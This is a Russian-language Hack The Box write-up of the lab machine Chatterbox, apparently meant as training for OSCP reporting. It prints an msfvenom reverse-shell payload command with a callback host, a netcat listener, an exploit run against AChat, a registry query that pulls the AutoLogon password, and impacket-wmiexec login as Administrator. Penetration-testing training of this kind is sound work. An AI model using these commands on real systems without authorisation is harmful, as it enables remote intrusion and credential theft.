# Chatterbox (HTB)

> Платформа: Hack The Box  
> ОС: Windows  
> Сложность: Средне  
> Результат: Administrator

---

## Цепочка Атаки

```text
Разведка
  |-- Сканирование Nmap выявляет SMB и службу AChat
  \-- Первоначальный Доступ
       |-- AChat 0.150 beta7 SEH Buffer Overflow
       \-- Обратная оболочка как alfred
Повышение Привилегий
  |-- Утечка пароля из реестра AutoLogon
  \-- WMIExec как Administrator
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины
Chatterbox - это машина средней сложности под управлением Windows 7 Professional. На ней размещен уязвимый чат-сервер (AChat), который можно эксплуатировать через переполнение буфера для получения первоначальной оболочки. Повышение привилегий достигается путем поиска пароля в открытом виде в реестре Windows.

## Разведка
Полное сканирование TCP-портов выявляет несколько стандартных служб Windows и пользовательское чат-приложение.

```bash
$ nmap -p- --min-rate 5000 -T4 -Pn -n 10.10.10.74
...
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9255/tcp open  http
9256/tcp open  achat
```

Определение служб подтверждает ОС и конкретную версию программного обеспечения для чата.

```bash
$ nmap -sC -sV -p 135,139,445,9255,9256 10.10.10.74
...
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
```

## Первичный Доступ
No CVE (custom vulnerability) - служба AChat 0.150 beta7 уязвима к переполнению буфера на основе SEH в обработчике UDP-сообщений; публичный CVE не назначен.

Поиск публичных эксплойтов выявляет Python-скрипт, нацеленный на эту конкретную версию.

```bash
$ searchsploit AChat
...
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

Мы копируем эксплойт и генерируем пейлоад для обратной оболочки. Пейлоад кодируется с помощью `unicode_mixed` и избегает плохих символов (`\x00\x0a\x0d\x20`), чтобы предотвратить преждевременное падение службы.

```bash
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -e x86/unicode_mixed -b '\x00\x0a\x0d\x20' BufferRegister=EAX -f python
...
Payload size: 642 bytes
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

После обновления скрипта нашим IP-адресом и пейлоадом мы запускаем прослушиватель и выполняем эксплойт.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ python3 exploit.py
---->{P00F}!
```

Цель подключается обратно, предоставляя нам оболочку как `alfred`.

```text
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

Теперь мы можем прочитать пользовательский флаг.

```cmd
C:\Windows\system32> type C:\Users\Alfred\Desktop\user.txt
<USER_FLAG>
```

## Повышение Привилегий
Проверка реестра Windows на наличие учетных данных AutoLogon выявляет пароль в открытом виде для учетной записи Administrator.

```cmd
C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
...
    DefaultPassword    REG_SZ    <PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Используя найденный пароль, мы аутентифицируемся как Administrator через WMI. Хотя `psexec` дает оболочку SYSTEM, файл `root.txt` защищен списками контроля доступа (ACL) (Access is denied). Использование `wmiexec` запускает оболочку в контексте пользователя Administrator, обходя это ограничение.

```bash
$ impacket-wmiexec Administrator:'<PASSWORD>'@10.10.10.74
...
C:\> whoami
chatterbox\administrator
```

Наконец, мы читаем root-флаг.

```cmd
C:\> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

## Флаги

| Флаг | Значение |
|------|----------|
| Пользователь | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Ключевые Выводы
- Пользовательские чат-приложения (такие как AChat) часто уязвимы к базовым переполнениям буфера; всегда проверяйте `searchsploit` и адаптируйте пейлоады, чтобы избежать плохих символов.
- Всегда проверяйте реестр на наличие учетных данных AutoLogon (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`), когда у вас есть любой уровень доступа.
- `psexec` работает как SYSTEM, что может быть заблокировано списками контроля доступа (ACL) к файлам, даже если у вас есть права администратора. `wmiexec` работает от имени пользователя, обходя эти специфические ограничения.
